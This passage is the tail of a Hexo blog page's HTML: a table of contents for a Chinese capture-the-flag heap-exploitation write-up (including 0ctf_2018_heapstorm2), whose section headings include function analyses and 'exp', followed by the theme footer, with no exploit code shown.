class="toc-text">add函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#edit%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.1.3.</span> <span class="toc-text">edit函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#free%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.1.4.</span> <span class="toc-text">free函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E4%B8%AA%E5%90%8E%E9%97%A8%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.1.5.</span> <span class="toc-text">一个后门函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">1.3.1.6.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B"><span class="toc-number">1.3.1.7.</span> <span class="toc-text">过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-number">1.3.1.8.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0ctf-2018-heapstorm2"><span class="toc-number">1.3.2.</span> <span class="toc-text">0ctf_2018_heapstorm2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#main"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">main</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ptr-xor"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">ptr_xor()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#size-xor"><span class="toc-number">1.3.2.3.</span> <span class="toc-text">size_xor()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#edit%E5%87%BD%E6%95%B0-1"><span class="toc-number">1.3.2.4.</span> <span class="toc-text">edit函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#free%E5%87%BD%E6%95%B0-1"><span class="toc-number">1.3.2.5.</span> <span class="toc-text">free函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#show%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.2.6.</span> <span class="toc-text">show函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-1"><span class="toc-number">1.3.3.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-1"><span class="toc-number">1.3.4.</span> <span class="toc-text">过程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-1"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas></body></html>